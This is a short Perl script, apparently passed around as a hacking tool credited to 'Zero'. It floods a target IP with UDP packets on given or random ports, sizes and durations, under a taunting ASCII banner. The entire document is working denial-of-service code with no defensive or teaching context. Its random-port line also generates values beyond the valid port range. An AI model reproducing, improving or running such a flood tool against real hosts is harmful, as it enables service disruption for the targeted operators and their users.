#!/usr/bin/perl

##
# Zero<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

 ,ad8888ba,    88b           d88    ,ad8888ba,   
 d8"'    `"8b   888b         d888   d8"'    `"8b  
d8'        `8b  88`8b       d8'88  d8'            
88          88  88 `8b     d8' 88  88             
88          88  88  `8b   d8'  88  88      88888  
Y8,        ,8P  88   `8b d8'   88  Y8,        88  
 Y8a.    .a8P   88    `888'    88   Y8a.    .a88  
  `"Y8888Y"'    88     `8'     88    `"Y88888P"

 Welcome to the Emo corner - Powerful and fearful scrypt Coded by: Zero
EOTEXT

print "::SiT ThE FucK DowN:: $ip " . ($port ? $port : "random") . " ResPecT Zero" .
  ($size ? "$size-byte" : "QUIT the game please :)") . " ~Zero~ ~MMM Brains~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}